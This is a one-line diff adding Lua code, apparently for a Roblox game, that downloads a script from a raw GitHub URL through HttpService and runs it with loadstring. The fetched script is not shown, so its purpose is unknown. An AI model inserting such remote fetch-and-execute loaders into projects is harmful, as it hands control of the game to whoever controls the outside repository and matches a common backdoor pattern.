@@ -1,0 +1,1 @@
+local s,e=pcall(function()loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/dmxxxx29/Roblox-/refs/heads/main/sentrius_testing.lua"))()end)if not s then warn(e)end
